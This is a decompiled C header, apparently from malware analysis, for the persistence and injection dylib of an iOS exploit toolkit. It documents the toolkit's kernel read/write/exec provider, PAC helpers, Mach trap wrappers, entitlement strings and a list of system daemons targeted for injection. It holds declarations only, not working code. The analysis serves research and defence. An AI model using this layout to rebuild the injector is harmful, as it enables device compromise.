/*
 * entry2.h - Decompiled header for entry2_type0x0f.dylib
 *
 * Reverse-engineered from the arm64e binary at:
 *   payloads/377bed7460f7538f96bbad7bdc2b8294bdc54599/entry2_type0x0f.dylib
 *
 * This dylib is the persistence/injection component of the Coruna toolkit.
 * It obtains kernel read/write primitives from type0x09 (LOADER) via its
 * exported _driver symbol, then uses those primitives to inject the MODULE
 * (type0x08) into target system daemons.
 *
 * Exports: _end, _last
 */

#ifndef ENTRY2_H
#define ENTRY2_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <pthread.h>

/* ── Error codes (observed constants) ──────────────────────────────── */

#define E2_ERR_NULL         0x000AD001  /* null argument */
#define E2_ERR_GENERIC      0x000AD009
#define E2_ERR_ALLOC        (E2_ERR_GENERIC + 8)  /* 0x000AD011, matches bootstrap ERR_ALLOC */
#define E2_ERR_BAD_MAGIC    0x700B  /* note: bootstrap uses 0x700C */
#define E2_ERR_NO_CONTAINER 0x7003
#define E2_ERR_NO_DRIVER    0x5005
#define E2_ERR_BAD_VERSION  (E2_ERR_NULL + 9)  /* 0x000AD00A */
#define E2_ERR_STAGE        0x0001F039  /* stage validation */
#define E2_ERR_IPC_BASE     0x0001E023
#define E2_ERR_IPC_TIMEOUT  (E2_ERR_IPC_BASE + 0x18)
#define E2_ERR_MSG_INVALID  0x0001E03A
#define E2_ERR_MACH_MSG     0x0001F037
#define E2_ERR_VM_FAIL      0x0001E038
#define E2_ERR_CSOPS        0x0001E037
#define E2_ERR_INIT         0x0001200F
#define E2_ERR_NO_FUNC      (E2_ERR_NULL + 0xF)
#define E2_ERR_TASK_INFO    0x0001E01D
#define E2_ERR_RESOLVE      0x0001E03F
#define E2_ERR_SYSCTL       0x000AD00B

/* ── Magic values ─────────────────────────────────────────────────── */

#define MAGIC_FOODBEEF      0xF00DBEEF
#define MAGIC_MH64          0xFEEDFACF  /* MH_MAGIC_64 */
#define MAGIC_FAT_LE        0xBEBAFECA  /* FAT_MAGIC */
#define MAGIC_FAT_BE        0xCAFEBABE  /* FAT_CIGAM */
#define MAGIC_MH64_LE       0xCEFAEDFE
#define MAGIC_MH64_BE       0xCFFAEDFE
#define MAGIC_MH64_BE2      0xCFFAEDFD

/* ── Mach trap numbers (raw svc #0x80 wrappers at 0x6000) ─────────── */

#define MACH_TRAP_MACH_VM_DEALLOCATE     (-12)  /* 0x6080 */
#define MACH_TRAP_MACH_PORT_DEALLOCATE   (-18)  /* 0x6068 */
#define MACH_TRAP_MACH_PORT_MOD_REFS     (-19)  /* 0x6098 */
#define MACH_TRAP_MACH_REPLY_PORT        (-24)  /* 0x6038 */
#define MACH_TRAP_THREAD_SELF            (-26)  /* 0x6044 */
#define MACH_TRAP_TASK_SELF              (-27)  /* 0x6050 */
#define MACH_TRAP_HOST_SELF              (-28)  /* 0x605c */
#define MACH_TRAP_MACH_MSG               (-31)  /* 0x6074 */
#define MACH_TRAP_PID_FOR_TASK           (-47)  /* 0x6080 */

/* BSD syscalls */
#define SYS_GUARDED_OPEN_DPROTECTED      360    /* 0x6000 */
#define SYS_GUARDED_WRITE                361    /* 0x601c */

/* ── IOKit entitlement strings (in __cstring) ─────────────────────── */

/*
 * "<dict><key>com.apple.security.iokit-user-client-class</key>"
 * "<array><string>IOSurfaceRootUserClient</string>"
 * "<string>AGXDeviceUserClient</string></array></dict>"
 *
 * "<dict><key>task_for_pid-allow</key><true/></dict>"
 */

/* ── Driver object returned by type0x09's _driver() ───────────────── *
 * This is the same structure as module_vtable_t in bootstrap.h.
 * Bootstrap PAC-strips all function pointers at +0x10..+0x48
 * after receiving this from _driver(). Entry2 validates
 * version==2 and method_count>=2 before use.
 *
 * Layout confirmed from bootstrap.dylib disassembly at 0x870c–0x878c:
 *   ldr x0, [x8, #0x10]  → strip_pac → str x0, [x8, #0x10]  (fn_deinit)
 *   ldr x0, [x8, #0x18]  → strip_pac → str x0, [x8, #0x18]  (fn_init)
 *   ...through +0x48
 */
typedef struct driver {
    uint16_t version;           /* +0x00: must be 2 */
    uint16_t method_count;      /* +0x02: number of methods, must be >= 2 */
    uint64_t _pad;              /* +0x04: 8 bytes padding (+4 implicit alignment) */
    void    *fn_deinit;         /* +0x10: module deinit */
    void    *fn_init;           /* +0x18: module init */
    void    *fn_cleanup;        /* +0x20: cleanup handler */
    void    *fn_command;        /* +0x28: command dispatch */
    void    *fn_30;             /* +0x30: additional method */
    void    *fn_38;             /* +0x38: additional method */
    void    *fn_40;             /* +0x40: additional method */
    void    *fn_48;             /* +0x48: additional method */
} driver_t;

/* ── Connection to type0x09 LOADER ────────────────────────────────── */

typedef struct type09_connection {
    void    *context;           /* +0x00: internal driver context (driver_backend_t*) */
    void    *target_info;       /* +0x08: bound target descriptor (driver_t*) */
    void    *driver_ref;        /* +0x10: driver reference for connect (validated in 0x11488) */
    void    *driver_conn;       /* +0x18: active driver connection handle */
} type09_connection_t;  /* 0x20 bytes total */

/* ── Type0x09 vtable (created at 0x105a4) ─────────────────────────── */

typedef struct type09_vtable {
    uint32_t flags;             /* +0x00: 0x20002 */
    uint32_t _pad;
    void    *context;           /* +0x08: type09_connection_t* */
    void   (*fn_close)(void*);  /* +0x10: close/cleanup */
    void   (*fn_alloc)(void*, uint32_t flags, void **out, void *extra);
                                /* +0x18: allocate memory in type0x09 */
    void   (*fn_dealloc)(void*);/* +0x20: deallocate */
    void   (*fn_query)(void*);  /* +0x28: query info */
    void   (*fn_dlsym)(void *ctx, const char *name, void **out);
                                /* +0x30: resolve symbol from type0x09 */
    void   (*fn_38)(void*);     /* +0x38 */
    void   (*fn_40)(void*);     /* +0x40 */
    void   (*fn_48)(void*);     /* +0x48 */
} type09_vtable_t;

/* ── KRW provider vtable (created at 0x11298) ─────────────────────── */

typedef struct krw_provider {
    uint32_t flags;             /* +0x00: 0x10003 */
    uint32_t _pad;
    void    *context;           /* +0x08: type09_connection_t* */

    /* All function pointers are PAC-signed with paciza */

    kern_return_t (*close)(void *self);
                                /* +0x10: 0x11510 — destroy provider, free memory */

    kern_return_t (*bind)(void *self, void *target);
                                /* +0x18: 0x115a8 — bind to target process descriptor */

    kern_return_t (*unbind)(void *self);
                                /* +0x20: 0x11634 — unbind from target, cleanup driver */

    kern_return_t (*get_info)(void *self);
                                /* +0x28: 0x11704 — get driver info via csops */

    kern_return_t (*open_rw)(void *self, const char *name,
                             uint32_t name_len, uint32_t flags, void **out);
                                /* +0x30: 0x11720 — open a kernel r/w channel */

    kern_return_t (*kread)(void *self, uint64_t kaddr, uint32_t type);
                                /* +0x38: 0x1183c — kernel virtual read (dispatch → 0xba30) */

    kern_return_t (*kwrite)(void *self, uint64_t kaddr, void *data,
                            uint32_t size, ...);
                                /* +0x40: 0x11898 — kernel virtual write (→ 0xc634) */

    kern_return_t (*kexec)(void *self, uint64_t kaddr, ...);
                                /* +0x48: 0x118d4 — kernel exec/call (→ 0xc870) */

    kern_return_t (*kalloc)(void *self, uint64_t addr, void *data,
                            uint32_t size, ...);
                                /* +0x50: 0x11914 — kernel allocate (→ 0xc400) */

    kern_return_t (*get_port)(void *self, mach_port_t port,
                              void *out_rights, void *out_port);
                                /* +0x58: 0x11968 — get task port via krw (→ 0xb854)
                                 * Note: disasm shows only 4 args (self, port, out_rights, out_port).
                                 * Internally calls e2_get_task_port(port, out_rights, 0, out_port, 0) */

    kern_return_t (*physrw)(void *self, uint64_t physaddr,
                            void *buf, uint32_t size);
                                /* +0x60: 0x1186c — physical memory r/w (→ 0xba30) */

    void *       (*get_base)(void *self);
                                /* +0x68: 0x119a0 — get kernel base address */
} krw_provider_t;

/* ── KRW channel (created at 0x11720) ─────────────────────────────── */

typedef struct krw_channel {
    uint16_t version;           /* +0x00: 1 */
    uint16_t _pad02;
    uint32_t _pad04;
    void    *driver_handle;     /* +0x08: handle from driver backend */
    uint64_t target_addr;       /* +0x10 */
    uint32_t target_size;       /* +0x18 */
    uint32_t _pad1c;
    void    *extra;             /* +0x20 */
    void   (*fn_read)(void*);   /* +0x28: PAC-signed read op */
    void   (*fn_write)(void*);  /* +0x30: PAC-signed write op */
    void   (*fn_info)(void*);   /* +0x38: PAC-signed info op */
} krw_channel_t;

/* ── Driver backend context (created at 0x182a8, 0x178 bytes) ─────── */

typedef struct driver_backend {
    void    *driver_ref;        /* +0x00: driver_t* from type0x09 */
    void    *target_binding;    /* +0x08: bound target descriptor */
    bool     owns_target;       /* +0x10: whether we allocated the target */
    uint8_t  _pad11[0x0B];
    uint8_t  flags_1c;          /* +0x1c */
    uint8_t  sandbox_result;    /* +0x1d */
    uint8_t  _pad1e[0x02];
    void    *libcache_handle;   /* +0x20: dlopen("/usr/lib/system/libcache.dylib") */
    /* ... further fields for symbol resolution, Mach-O parsing ... */
    uint32_t kern_version;      /* +0x18: extracted from dyld header */
    /* ... */
    void    *mach_header;       /* +0xC8: _NSGetMachExecuteHeader() */
    void    *argc_ptr;          /* +0xD0: _NSGetArgc() */
    void    *argv_ptr;          /* +0xD8: _NSGetArgv() */
    void    *environ_ptr;       /* +0xE0: _NSGetEnviron() */
    void    *progname_ptr;      /* +0xE8: _NSGetProgname() */
    /* ... rest of 0x178 bytes ... */
} driver_backend_t;

/* ── F00DBEEF container entry (16 bytes each) ─────────────────────── *
 * Layout confirmed from bootstrap.dylib at 0x7c9c–0x7e0c:
 *   type_flags at +0x00, flags at +0x04,
 *   data_offset at +0x08, data_size at +0x0c
 */
typedef struct foodbeef_entry {
    uint32_t type_flags;        /* upper 16 bits = segment type */
    uint32_t flags;             /* typically 0x00000003 */
    uint32_t data_offset;       /* offset within container */
    uint32_t data_size;         /* size of data */
} foodbeef_entry_t;

/* ── F00DBEEF container header (for custom dlsym at 0x1dc98) ──────── */

typedef struct foodbeef_container {
    uint32_t magic;             /* 0xF00DBEEF */
    uint32_t entry_count;
    foodbeef_entry_t entries[]; /* flexible array of 16-byte entries */
} foodbeef_container_t;

/* ── Resolver object (created at 0x1dbc0, 0x38 bytes) ─────────────── */

typedef struct symbol_resolver {
    uint32_t flags;             /* +0x00: 0x10001 */
    uint32_t _pad;
    void    *dyld_handle;       /* +0x08: internal dyld handle */

    kern_return_t (*fn_lookup)(void *handle, void *container, uint32_t size);
                                /* +0x10: symbol lookup function */

    kern_return_t (*fn_18)(void*);
                                /* +0x18 */

    kern_return_t (*fn_20)(void*);
                                /* +0x20 */

    kern_return_t (*fn_28)(void*);
                                /* +0x28 */

    kern_return_t (*fn_30)(void*);
                                /* +0x30 */
} symbol_resolver_t;

/* ── Mach IPC message layout ──────────────────────────────────────── */

typedef struct e2_mach_msg {
    mach_msg_header_t header;   /* +0x00 */
    uint32_t          msg_id;   /* +0x18: identifies message type */
    uint32_t          flags;    /* +0x1c */
    /* payload follows */
} e2_mach_msg_t;

/* ── IPC response (from 0xa908/0xaa00) ────────────────────────────── */

typedef struct ipc_response {
    uint32_t field_00;          /* +0x00: flags (bit 31 checked) */
    uint32_t field_04;          /* +0x04: total size */
    uint8_t  _pad08[0x0C];
    uint32_t msg_type;          /* +0x14: expected 1 or 2 */
    uint32_t name_len;          /* +0x18: length of name string */
    uint32_t extra_len;         /* +0x1c: length of extra data */
    char     name[];            /* +0x20: null-terminated name, then extra data */
} ipc_response_t;

/* ── Thread worker context (passed to pthread_create at 0xa378) ───── */

typedef struct worker_ctx {
    void             *fn;       /* +0x00: function to call (PAC-signed) */
    krw_provider_t   *krw;      /* +0x08: krw provider */
    void             *data;     /* +0x10: module data buffer */
    uint32_t          data_len; /* +0x18: module data length */
    /* populated before thread spawn, read by worker */
} worker_ctx_t;

/* ── Process name whitelist for daemon matching ───────────────────── */

static const char *g_daemon_whitelist[] = {
    "launchd",
    "UserEventAgent",
    "runningboardd",
    "fseventsd",
    "misd",
    "configd",
    "powerd",
    "keybagd",
    "remoted",
    "wifid",
    "watchdogd",
    "thermalmonitord",
    "containermanagerd",
    "driverkitd",
    "lockdownd",
    "AppleCredentialManagerDaemon",
    "peakpowermanagerd",
    "notifyd",
    "cfprefsd",
    "apfs_iosd",
    "ospredictiond",
    "biometrickitd",
    "locationd",
    "nehelper",
    "nesessionmanager",
    "CloudKeychainProxy",
    "filecoordinationd",
    "osanalyticshelper",
    "CAReportingService",
    "wifianalyticsd",
    "logd_helper",
    "OTATaskingAgent",
    "wifip2pd",
    "amfid",
    "GSSCred",
    "nanoregistrylaunchd",
    "mobile_storage_proxy",
    "MobileStorageMounter",
    "diskimagescontroller",
    "online-auth-agent",
    "DTServiceHub",
    "diagnosticd",
    "wifivelocityd",
    "deleted_helper",
    "coresymbolicationd",
    "tailspind",
    "backupd",
    "SpringBoard",
    NULL
};
#define DAEMON_WHITELIST_COUNT  48  /* 48 non-NULL entries; table is 0x190 bytes (50 ptrs) in binary */

/* ── Function declarations ────────────────────────────────────────── */

/* PAC helpers (0x861c–0x8664) */
uint64_t e2_pacia(uint64_t ptr, uint64_t ctx);
uint64_t e2_pacda(uint64_t ptr, uint64_t ctx);
uint64_t e2_pacib(uint64_t ptr, uint64_t ctx);
uint64_t e2_pacdb(uint64_t ptr, uint64_t ctx);
int      e2_check_pac(void);
uint64_t e2_strip_pac(uint64_t ptr);
uint64_t e2_sign_pointer(uint64_t ptr, uint64_t ctx);

/* Mach trap wrappers (0x6000–0x60a0) */
int64_t  e2_trap_guarded_open(uint64_t a, uint64_t b, uint64_t c, uint64_t d);
int64_t  e2_trap_guarded_write(uint64_t a, uint64_t b, uint64_t c, uint64_t d);
mach_port_t e2_trap_mach_reply_port(void);
mach_port_t e2_trap_thread_self(void);
mach_port_t e2_trap_task_self(void);
mach_port_t e2_trap_host_self(void);
kern_return_t e2_trap_port_dealloc(mach_port_t task, mach_port_t port);
kern_return_t e2_trap_mach_msg(void *msg, uint32_t option, uint32_t send_size,
                               uint32_t rcv_size, mach_port_t rcv_name,
                               uint32_t timeout, mach_port_t notify);
int      e2_trap_pid_for_task(mach_port_t task);
kern_return_t e2_trap_vm_dealloc(mach_port_t task, uint64_t addr, uint64_t size);
kern_return_t e2_trap_port_mod_refs(mach_port_t task, mach_port_t port,
                                     uint32_t right, int32_t delta);

/* Custom dlsym (0x1dc98) */
kern_return_t e2_custom_dlsym(void *output, void *container, uint32_t size);

/* Resolver (0x1dbc0) */
kern_return_t e2_create_resolver(symbol_resolver_t **out);

/* Container parsing (0x60a4–0x6124) */
kern_return_t e2_parse_and_resolve(void *ctx);

/* Linker/loader (0x6128–0x6460) */
kern_return_t e2_link_module(void *ctx, void *name, void *data,
                              void *extra, uint32_t *stage);

/* Mach IPC (0xa6b8, 0xa820, 0xab30) */
kern_return_t e2_send_recv_msg(mach_port_t port, uint32_t msg_id,
                               uint32_t flags, void **reply, uint32_t *reply_size);
kern_return_t e2_send_msg(mach_port_t port, uint32_t msg_id,
                          mach_port_t reply_port, uint32_t extra, uint32_t final);
kern_return_t e2_recv_msg(mach_port_t port, uint32_t max_size,
                          uint32_t options, uint32_t timeout,
                          void **out, uint32_t *out_size);

/* Runtime context (0xa908) */
kern_return_t e2_get_runtime_context(uint32_t stage,
                                     ipc_response_t **out, uint32_t *out_size);

/* Driver init (0x182a8) */
kern_return_t e2_init_driver_backend(driver_backend_t *out, driver_t *driver,
                                     void *target, const char *extra);

/* Driver connect (0xc12c) */
kern_return_t e2_driver_connect(void *dest, void *driver_ref,
                                void *target, void *binding);

/* Driver cleanup (0xc094) */
kern_return_t e2_driver_cleanup(void *driver_ctx);

/* Driver backend destroy (0x185d0) */
kern_return_t e2_destroy_driver_backend(void *backend);

/* Driver backend sub-cleanup (0x14714) */
kern_return_t e2_backend_sub_cleanup(void *backend);

/* Bind target to driver context (0x18670) */
kern_return_t e2_bind_target(void *context, void *target);

/* Get driver info via csops (0x187d4) */
kern_return_t e2_get_driver_info(void *internal);

/* KRW provider (0x11298) */
kern_return_t e2_create_krw_provider(void *output, driver_t *driver,
                                     void *target, void *extra,
                                     void *context, int flags);

/* KRW dispatch (0xba30) — generic kernel r/w dispatch
 * Called with different arg counts depending on operation:
 *   kread:  e2_krw_dispatch(kaddr, 3)          — virtual read, type=3
 *   physrw: e2_krw_dispatch(physaddr, buf, size) — physical r/w
 *   kalloc: e2_krw_dispatch(name, alloc_size, &out_port)
 */
kern_return_t e2_krw_dispatch(uint64_t arg0, ...);

/* Task port via krw (0xb854) */
kern_return_t e2_get_task_port(mach_port_t port, void *out_rights,
                               void *arg2, void *out_port, void *arg4);

/* Kernel write implementation (0xc634) */
kern_return_t e2_kwrite_impl(void *driver_conn, mach_port_t port,
                              void *data, uint32_t size,
                              void *path, void *x5, uint32_t x6,
                              void *x7 /*, stack args */);

/* Kernel exec implementation (0xc870) */
kern_return_t e2_kexec_impl(void *driver_conn, int32_t count,
                             void *data, uint32_t size,
                             void *path, void *x5, uint32_t x6,
                             void *x7 /*, stack args */);

/* Kernel alloc implementation (0xc400) */
kern_return_t e2_kalloc_impl(void *driver_conn, void *name,
                              uint64_t alloc_size, void *data,
                              uint32_t size, void *path,
                              uint32_t x6, void *x7 /*, stack args */);

/* IOKit connection (0x17e7c) */
kern_return_t e2_iokit_connect(void *driver, const char *name,
                               uint32_t name_len, uint32_t flags,
                               void **out);

/* Memory helpers (0x10010, 0x100a4) */
void *e2_memcpy_custom(void *dst, const void *src, size_t len);
void *e2_memset_custom(void *dst, int val, size_t len);

/* Exports */
kern_return_t _end(mach_port_t port, uint32_t conn_info,
                   void *container_data, void *extra, uint32_t stage);
void          _last(void *ctx, uint32_t size, void *data,
                    uint32_t flags, void *stack, uint32_t cleanup);

#endif /* ENTRY2_H */
